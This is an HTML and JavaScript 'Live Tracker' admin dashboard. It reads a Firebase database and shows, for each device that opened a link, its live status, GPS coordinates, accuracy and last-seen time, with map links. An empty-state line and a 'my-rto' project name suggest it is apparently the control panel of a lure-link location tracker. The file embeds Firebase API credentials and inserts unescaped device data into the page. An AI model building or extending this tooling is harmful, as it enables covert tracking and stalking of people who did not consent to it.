<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🔒 Admin Panel — Live Tracker</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
}

body {
  background: #0a0a0a;
  color: #fff;
  min-height: 100vh;
  padding: 20px;
}

/* ============================================================
   🔝 HEADER
   ============================================================ */
.header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 20px;
  padding: 16px 20px;
  background: #1c1c1e;
  border-radius: 16px;
  border: 1px solid #2c2c2e;
  flex-wrap: wrap;
  gap: 12px;
}

.header h1 {
  font-size: 20px;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 10px;
}

.header .live-dot {
  width: 10px;
  height: 10px;
  background: #34A853;
  border-radius: 50%;
  animation: pulse 1s infinite;
}

@keyframes pulse {
  0%, 100% { opacity: 1; transform: scale(1); }
  50% { opacity: 0.5; transform: scale(0.8); }
}

.header .stats {
  display: flex;
  gap: 24px;
  flex-wrap: wrap;
}

.header .stat {
  text-align: center;
}

.header .stat .num {
  font-size: 22px;
  font-weight: 700;
  color: #1a73e8;
}

.header .stat .label {
  font-size: 11px;
  color: #8e8e93;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

/* ============================================================
   🎛️ CONTROLS
   ============================================================ */
.controls {
  display: flex;
  gap: 12px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.controls input {
  flex: 1;
  min-width: 200px;
  padding: 12px 16px;
  background: #1c1c1e;
  border: 1px solid #2c2c2e;
  border-radius: 12px;
  color: #fff;
  font-size: 14px;
  outline: none;
  font-family: inherit;
}

.controls input:focus {
  border-color: #1a73e8;
}

.controls button {
  padding: 12px 24px;
  background: #1a73e8;
  border: none;
  border-radius: 12px;
  color: #fff;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  font-family: inherit;
  transition: transform 0.15s;
}

.controls button:active {
  transform: scale(0.97);
}

.controls button.danger {
  background: #EA4335;
}

.controls button.success {
  background: #34A853;
}

/* ============================================================
   📱 DEVICES GRID
   ============================================================ */
.devices-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
  gap: 16px;
}

.device-card {
  background: #1c1c1e;
  border-radius: 16px;
  padding: 20px;
  border: 1px solid #2c2c2e;
  transition: all 0.2s;
  position: relative;
  overflow: hidden;
}

.device-card:hover {
  border-color: #1a73e8;
  transform: translateY(-2px);
}

.device-card.online {
  border-left: 4px solid #34A853;
}

.device-card.offline {
  border-left: 4px solid #8e8e93;
  opacity: 0.7;
}

.device-card.background {
  border-left: 4px solid #FBBC05;
}

/* Device header */
.device-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
  padding-bottom: 16px;
  border-bottom: 1px solid #2c2c2e;
}

.device-icon {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  background: linear-gradient(135deg, #1a73e8, #34A853);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 22px;
  flex-shrink: 0;
}

.device-info {
  flex: 1;
  min-width: 0;
}

.device-info .device-id {
  font-size: 14px;
  font-weight: 600;
  margin-bottom: 4px;
  word-break: break-all;
}

.device-info .device-name {
  font-size: 12px;
  color: #8e8e93;
}

.status-badge {
  padding: 4px 12px;
  border-radius: 12px;
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  flex-shrink: 0;
}

.status-badge.online {
  background: rgba(52,168,83,0.15);
  color: #34A853;
}

.status-badge.offline {
  background: rgba(142,142,147,0.15);
  color: #8e8e93;
}

.status-badge.background {
  background: rgba(251,188,5,0.15);
  color: #FBBC05;
}

/* Data rows */
.data-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px 0;
  font-size: 13px;
  border-bottom: 1px solid rgba(255,255,255,0.03);
}

.data-row:last-child {
  border-bottom: none;
}

.data-row .label {
  color: #8e8e93;
  display: flex;
  align-items: center;
  gap: 6px;
}

.data-row .value {
  font-weight: 600;
  color: #fff;
  text-align: right;
  word-break: break-all;
  max-width: 60%;
}

.data-row .value.green {
  color: #34A853;
}

.data-row .value.yellow {
  color: #FBBC05;
}

.data-row .value.red {
  color: #FF3B30;
}

/* Action buttons */
.device-actions {
  display: flex;
  gap: 8px;
  margin-top: 16px;
  padding-top: 16px;
  border-top: 1px solid #2c2c2e;
}

.device-actions button {
  flex: 1;
  padding: 10px;
  border: none;
  border-radius: 10px;
  font-size: 12px;
  font-weight: 600;
  cursor: pointer;
  font-family: inherit;
  transition: all 0.15s;
}

.device-actions .btn-map {
  background: #1a73e8;
  color: #fff;
}

.device-actions .btn-delete {
  background: rgba(234,67,53,0.15);
  color: #EA4335;
}

.device-actions button:active {
  transform: scale(0.97);
}

/* Time ago */
.time-ago {
  font-size: 11px;
  color: #5f6368;
  margin-top: 8px;
  text-align: center;
}

/* ============================================================
   🗺️ MAP MODAL
   ============================================================ */
.map-modal {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.95);
  display: none;
  align-items: center;
  justify-content: center;
  padding: 20px;
  z-index: 9999;
}

.map-modal.show {
  display: flex;
}

.map-content {
  background: #1c1c1e;
  border-radius: 20px;
  padding: 20px;
  max-width: 800px;
  width: 100%;
  max-height: 90vh;
  overflow-y: auto;
}

.map-content h2 {
  font-size: 18px;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.map-content .close {
  background: rgba(255,255,255,0.1);
  border: none;
  color: #fff;
  width: 32px;
  height: 32px;
  border-radius: 50%;
  cursor: pointer;
  font-size: 16px;
}

.map-iframe {
  width: 100%;
  height: 400px;
  border-radius: 12px;
  border: none;
  margin-bottom: 16px;
}

.map-details {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}

.map-details .detail {
  background: #2c2c2e;
  padding: 12px;
  border-radius: 10px;
  font-size: 13px;
}

.map-details .detail .label {
  color: #8e8e93;
  font-size: 11px;
  text-transform: uppercase;
  margin-bottom: 4px;
}

/* ============================================================
   🍞 TOAST
   ============================================================ */
.toast {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(44,44,46,0.95);
  backdrop-filter: blur(20px);
  color: #fff;
  padding: 12px 24px;
  border-radius: 24px;
  font-size: 13px;
  z-index: 99999;
  animation: toastIn 0.3s;
  box-shadow: 0 8px 32px rgba(0,0,0,0.5);
}

@keyframes toastIn {
  from { opacity: 0; transform: translateX(-50%) translateY(20px); }
  to { opacity: 1; transform: translateX(-50%) translateY(0); }
}

/* ============================================================
   📭 EMPTY STATE
   ============================================================ */
.empty {
  text-align: center;
  padding: 60px 20px;
  color: #8e8e93;
  grid-column: 1 / -1;
}

.empty .icon {
  font-size: 64px;
  margin-bottom: 16px;
  opacity: 0.5;
}

.empty h3 {
  font-size: 18px;
  margin-bottom: 8px;
  color: #fff;
}

@media (max-width: 600px) {
  .header h1 { font-size: 16px; }
  .header .stats { gap: 16px; }
  .devices-grid { grid-template-columns: 1fr; }
}
</style>
</head>
<body>

<!-- HEADER -->
<div class="header">
  <h1>
    <div class="live-dot"></div>
    🔒 Admin Panel
  </h1>
  <div class="stats">
    <div class="stat">
      <div class="num" id="totalDevices">0</div>
      <div class="label">Devices</div>
    </div>
    <div class="stat">
      <div class="num" id="onlineCount" style="color:#34A853;">0</div>
      <div class="label">Online</div>
    </div>
    <div class="stat">
      <div class="num" id="bgCount" style="color:#FBBC05;">0</div>
      <div class="label">Background</div>
    </div>
    <div class="stat">
      <div class="num" id="offlineCount" style="color:#8e8e93;">0</div>
      <div class="label">Offline</div>
    </div>
  </div>
</div>

<!-- CONTROLS -->
<div class="controls">
  <input type="text" id="searchInput" placeholder="🔍 Search device ID, name, city..." oninput="filterDevices()">
  <button onclick="loadData()">🔄 Refresh</button>
  <button class="danger" onclick="clearAll()">🗑️ Clear All</button>
</div>

<!-- DEVICES GRID -->
<div class="devices-grid" id="devicesGrid">
  <div class="empty">
    <div class="icon">📱</div>
    <h3>Loading devices...</h3>
  </div>
</div>

<!-- MAP MODAL -->
<div class="map-modal" id="mapModal">
  <div class="map-content">
    <h2>
      <span id="mapTitle">📍 Device Location</span>
      <button class="close" onclick="closeMap()">✕</button>
    </h2>
    <iframe class="map-iframe" id="mapIframe" src=""></iframe>
    <div class="map-details" id="mapDetails"></div>
  </div>
</div>

<script type="module">
/* ============================================================
   🔥 FIREBASE
   ============================================================ */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, onValue, remove, update }
  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
  authDomain: "my-rto-b2531.firebaseapp.com",
  databaseURL: "https://db101-ff3d6-default-rtdb.firebaseio.com",
  projectId: "db101-ff3d6",
  storageBucket: "db101-ff3d6.appspot.com",
  messagingSenderId: "465334829178",
  appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
console.log('✅ Firebase connected');

/* ============================================================
   🎯 STATE
   ============================================================ */
let devices = {};        // devices_root data
let locations = {};      // loc_find data
let filteredDevices = {};
let currentMapDevice = null;

/* ============================================================
   📥 LOAD DATA LIVE
   ============================================================ */
function loadData() {
  console.log('🔄 Loading data...');

  // 🔥 devices_root
  onValue(ref(db, 'devices_root'), (snap) => {
    devices = snap.val() || {};
    console.log('📱 Devices:', Object.keys(devices).length);
    renderDevices();
  });

  // 🔥 loc_find
  onValue(ref(db, 'loc_find'), (snap) => {
    locations = snap.val() || {};
    console.log('📍 Locations:', Object.keys(locations).length);
    renderDevices();
  });
}

/* ============================================================
   🎨 RENDER DEVICES
   ============================================================ */
function renderDevices() {
  const grid = document.getElementById('devicesGrid');
  const deviceIds = Object.keys(devices);

  if (deviceIds.length === 0) {
    grid.innerHTML = `
      <div class="empty">
        <div class="icon">📭</div>
        <h3>No devices yet</h3>
        <p>User link kholenge toh yahan dikhenge</p>
      </div>
    `;
    updateStats();
    return;
  }

  // Search filter
  const query = (document.getElementById('searchInput').value || '').toLowerCase();
  const filtered = deviceIds.filter(id => {
    if (!query) return true;
    const d = devices[id];
    const loc = locations[id];
    return (
      id.toLowerCase().includes(query) ||
      (d.deviceName || '').toLowerCase().includes(query) ||
      (d.pageName || '').toLowerCase().includes(query)
    );
  });

  // Sort — online first
  filtered.sort((a, b) => {
    const aStatus = devices[a].status || 'offline';
    const bStatus = devices[b].status || 'offline';
    const order = { active: 0, background: 1, closed: 2 };
    return (order[aStatus] ?? 3) - (order[bStatus] ?? 3);
  });

  filteredDevices = filtered;

  grid.innerHTML = filtered.map(id => renderDeviceCard(id)).join('');

  updateStats();
}

/* ============================================================
   📱 RENDER SINGLE CARD
   ============================================================ */
function renderDeviceCard(deviceId) {
  const d = devices[deviceId];
  const loc = locations[deviceId];

  const status = d.status || 'offline';
  const statusClass = status === 'active' ? 'online' : status === 'background' ? 'background' : 'offline';
  const statusText = status === 'active' ? '🟢 ONLINE' : status === 'background' ? '🟡 BACKGROUND' : '⚫ OFFLINE';

  // Time since last seen
  const timeAgo = d.lastSeen ? getTimeAgo(d.lastSeen) : 'never';

  // Icon based on device
  let icon = '💻';
  if ((d.deviceName || '').toLowerCase().includes('iphone')) icon = '📱';
  else if ((d.deviceName || '').toLowerCase().includes('ipad')) icon = '📱';
  else if ((d.deviceName || '').toLowerCase().includes('android')) icon = '📱';
  else if ((d.deviceName || '').toLowerCase().includes('samsung')) icon = '📱';
  else if ((d.deviceName || '').toLowerCase().includes('realme')) icon = '📱';
  else if ((d.deviceName || '').toLowerCase().includes('redmi')) icon = '📱';
  else if ((d.deviceName || '').toLowerCase().includes('windows')) icon = '💻';
  else if ((d.deviceName || '').toLowerCase().includes('mac')) icon = '💻';

  // Location data
  const hasLocation = loc && loc.latitude && loc.longitude;
  const lat = hasLocation ? loc.latitude.toFixed(4) : '—';
  const lng = hasLocation ? loc.longitude.toFixed(4) : '—';
  const accuracy = hasLocation ? Math.round(loc.accuracy) + 'm' : '—';
  const updates = hasLocation ? (loc.updateCount || 0) : 0;
  const accuracyClass = hasLocation && loc.accuracy < 100 ? 'green' : hasLocation && loc.accuracy < 1000 ? 'yellow' : 'red';

  return `
    <div class="device-card ${statusClass}">
      <div class="device-header">
        <div class="device-icon">${icon}</div>
        <div class="device-info">
          <div class="device-id">${deviceId}</div>
          <div class="device-name">${d.deviceName || 'Unknown'} • ${d.pageName || '—'}</div>
        </div>
        <div class="status-badge ${statusClass}">${statusText}</div>
      </div>

      <div class="data-row">
        <span class="label">📍 Latitude</span>
        <span class="value">${lat}</span>
      </div>
      <div class="data-row">
        <span class="label">📍 Longitude</span>
        <span class="value">${lng}</span>
      </div>
      <div class="data-row">
        <span class="label">🎯 Accuracy</span>
        <span class="value ${accuracyClass}">${accuracy}</span>
      </div>
      <div class="data-row">
        <span class="label">📊 Updates</span>
        <span class="value">${updates}</span>
      </div>
      <div class="data-row">
        <span class="label">🕐 Last seen</span>
        <span class="value">${timeAgo}</span>
      </div>

      <div class="device-actions">
        ${hasLocation ? `<button class="btn-map" onclick="showMap('${deviceId}')">🗺️ View on Map</button>` : ''}
        <button class="btn-delete" onclick="deleteDevice('${deviceId}')">🗑️ Delete</button>
      </div>
    </div>
  `;
}

/* ============================================================
   📊 UPDATE STATS
   ============================================================ */
function updateStats() {
  const ids = Object.keys(devices);
  let online = 0, bg = 0, offline = 0;

  ids.forEach(id => {
    const s = devices[id].status;
    if (s === 'active') online++;
    else if (s === 'background') bg++;
    else offline++;
  });

  document.getElementById('totalDevices').textContent = ids.length;
  document.getElementById('onlineCount').textContent = online;
  document.getElementById('bgCount').textContent = bg;
  document.getElementById('offlineCount').textContent = offline;
}

/* ============================================================
   🔍 SEARCH FILTER
   ============================================================ */
function filterDevices() {
  renderDevices();
}

/* ============================================================
   🗺️ SHOW MAP
   ============================================================ */
function showMap(deviceId) {
  const loc = locations[deviceId];
  if (!loc || !loc.latitude) {
    showToast('❌ No location data');
    return;
  }

  const d = devices[deviceId];
  const lat = loc.latitude;
  const lng = loc.longitude;

  // Update title
  document.getElementById('mapTitle').textContent = `📍 ${deviceId}`;

  // Update iframe
  const bbox = `${lng - 0.01},${lat - 0.01},${lng + 0.01},${lat + 0.01}`;
  document.getElementById('mapIframe').src =
    `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lng}`;

  // Update details
  document.getElementById('mapDetails').innerHTML = `
    <div class="detail">
      <div class="label">Device</div>
      <div>${d.deviceName || 'Unknown'}</div>
    </div>
    <div class="detail">
      <div class="label">Page</div>
      <div>${d.pageName || '—'}</div>
    </div>
    <div class="detail">
      <div class="label">Latitude</div>
      <div>${lat.toFixed(6)}</div>
    </div>
    <div class="detail">
      <div class="label">Longitude</div>
      <div>${lng.toFixed(6)}</div>
    </div>
    <div class="detail">
      <div class="label">Accuracy</div>
      <div>${Math.round(loc.accuracy)}m</div>
    </div>
    <div class="detail">
      <div class="label">Last Update</div>
      <div>${loc.timeISO ? new Date(loc.timeISO).toLocaleString() : '—'}</div>
    </div>
    <div class="detail" style="grid-column: 1 / -1;">
      <div class="label">Google Maps Link</div>
      <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank"
         style="color: #1a73e8; text-decoration: none;">
        Open in Google Maps →
      </a>
    </div>
  `;

  document.getElementById('mapModal').classList.add('show');
  currentMapDevice = deviceId;
}

function closeMap() {
  document.getElementById('mapModal').classList.remove('show');
  document.getElementById('mapIframe').src = '';
  currentMapDevice = null;
}

/* ============================================================
   🗑️ DELETE DEVICE
   ============================================================ */
async function deleteDevice(deviceId) {
  if (!confirm(`Delete device ${deviceId}?`)) return;

  try {
    await remove(ref(db, 'devices_root/' + deviceId));
    await remove(ref(db, 'loc_find/' + deviceId));
    showToast('✅ Device deleted');
  } catch (err) {
    console.error(err);
    showToast('❌ Delete failed');
  }
}

/* ============================================================
   🗑️ CLEAR ALL
   ============================================================ */
async function clearAll() {
  if (!confirm('⚠️ Delete ALL devices? This cannot be undone!')) return;
  if (!confirm('⚠️ Really sure? All data will be lost!')) return;

  try {
    await remove(ref(db, 'devices_root'));
    await remove(ref(db, 'loc_find'));
    showToast('✅ All data cleared');
  } catch (err) {
    console.error(err);
    showToast('❌ Clear failed');
  }
}

/* ============================================================
   🕐 TIME AGO
   ============================================================ */
function getTimeAgo(timestamp) {
  const seconds = Math.floor((Date.now() - timestamp) / 1000);

  if (seconds < 5) return 'just now';
  if (seconds < 60) return seconds + 's ago';
  if (seconds < 3600) return Math.floor(seconds / 60) + 'm ago';
  if (seconds < 86400) return Math.floor(seconds / 3600) + 'h ago';
  return Math.floor(seconds / 86400) + 'd ago';
}

/* ============================================================
   🍞 TOAST
   ============================================================ */
function showToast(msg) {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();
  const toast = document.createElement('div');
  toast.className = 'toast';
  toast.textContent = msg;
  document.body.appendChild(toast);
  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transition = 'opacity 0.3s';
    setTimeout(() => toast.remove(), 300);
  }, 2000);
}

/* ============================================================
   🚀 INIT
   ============================================================ */
loadData();

// Auto-refresh time ago every 5 sec
setInterval(() => {
  if (Object.keys(devices).length > 0) {
    renderDevices();
  }
}, 5000);

// Expose
window.filterDevices = filterDevices;
window.loadData = loadData;
window.showMap = showMap;
window.closeMap = closeMap;
window.deleteDevice = deleteDevice;
window.clearAll = clearAll;

console.log('✅ Admin panel ready');
</script>

</body>
</html>
